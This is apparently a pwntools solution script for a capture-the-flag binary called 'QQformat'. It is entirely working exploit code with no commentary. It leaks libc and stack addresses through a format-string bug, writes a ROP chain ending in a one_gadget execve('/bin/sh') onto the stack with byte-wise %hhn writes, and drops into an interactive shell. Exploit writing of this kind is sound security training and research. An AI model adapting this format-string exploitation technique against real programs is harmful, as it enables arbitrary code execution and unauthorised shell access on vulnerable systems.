from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./QQformat')

r.sendline(b'%13$p')
libc = int(r.recvline().strip(), 16) - 0x024083
info(f'libc : {hex(libc)}')

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
pop_rdx_ret = libc + 0x0000000000142c92
pop_rsi_ret = libc + 0x000000000002601f
one_gad = libc + 0xe3b04

r.sendline(b'%10$p')
rbp = int(r.recvline().strip(), 16) - 0xf0
info(f'rbp : {hex(rbp)}')

def set_43_addr(stack_addr):
    r.sendline(f'%{stack_addr & 0xffff}c%30$hn.'.encode())
    r.recvuntil(b'.\n')

def write2addr(msg, addr):
    for i in range(8):
        set_43_addr(addr + i)
        if msg != 0:
            r.sendline(f'%{msg & 0xff}c%43$hhn.'.encode())
        else:
            r.sendline('%43$hhn.'.encode())
        r.recvuntil(b'.\n')
        msg >>= 8

write2addr(pop_rdx_ret, rbp + 8)
write2addr(0, rbp + 0x10)
write2addr(pop_rsi_ret, rbp + 0x18)
write2addr(0, rbp + 0x20)
write2addr(one_gad, rbp + 0x28)

r.sendline(b'%9$hhn'.ljust(8, b'\0') + p64(rbp - 0x24))

r.interactive()